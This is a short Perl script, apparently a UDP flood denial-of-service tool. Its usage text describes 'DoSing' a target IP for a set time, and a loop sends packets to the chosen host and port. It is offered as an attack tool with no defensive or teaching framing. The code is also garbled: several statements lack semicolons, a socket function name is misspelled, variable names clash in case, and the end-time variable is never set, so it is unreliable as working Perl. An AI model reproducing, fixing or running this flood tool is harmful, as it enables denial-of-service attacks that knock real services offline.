#!usr/bin/perl

print "
		X============================================================X
		|															  |
		|	  ******** **     **   ********      **     *******       |
		|	 **////// /**    /**  **//////**    ****   /**////**      |
		|	/**       /**    /** **      //    **//**  /**   /**      |
		|	/*********/**    /**/**           **  //** /*******       |
		|	////////**/**    /**/**    ***** **********/**///**       |
		|	       /**/**    /**//**  ////**/**//////**/**  //**      | 
		|	******** //*******  //******** /**     /**/**   //**      | 
		|	////////   ///////    ////////  //      // //     //	  |
		|															  |
		X============================================================X
		|             {https://github.com/marshmellows}              |
		X========================[by Scratch]========================X 
"

#use
use Socket;
use strict;

#version
$version = "\n<Version 1.2>"

print ($version)

print "\n"
if ($#ARGV !=3) {
	print "\n\t\t***Command must recieve four arguments****\n";
	print "-Ex) perl DoS.pl 1.1.1.1 80 1000 300"
	print "Therfore DoSing the IP '1.1.1.1' for '300' seconds on port '80' using '1000' packets\n\n;"
	exit(1);
#input	
}

my ($IP,$port,$size,$time) = @ARGV;
my ($iaddr,$endtime,$psize,$pport);
$iaddr = inet_acton("$ip") or die "cannot connect to $ip\n";
$sendtime = time() + ($time ? $time : 1000000);
socket(flood, PF_INET, SOCK_DGRAM, 17);
print "~To cancel the attack press \'Ctrl-C\'\n\n";
print "|IP|\t\t|Port|\t\t|Size|\t\t|Time|\n";
print "|$ip|\t |$port|\t\t |$size|\t\t|$time|\n" unless $time;
#displaying data
for (;time() <= $endtime;) {
	$psize = $size ? $size : int(rand(1500-64)+64) ;
	$pport = $port ? $port : int(rand(65500))+1;

	send(flood, pack("a$psize", "flood"), 0, pack_sockaddr_in($pport, $iaddr));
}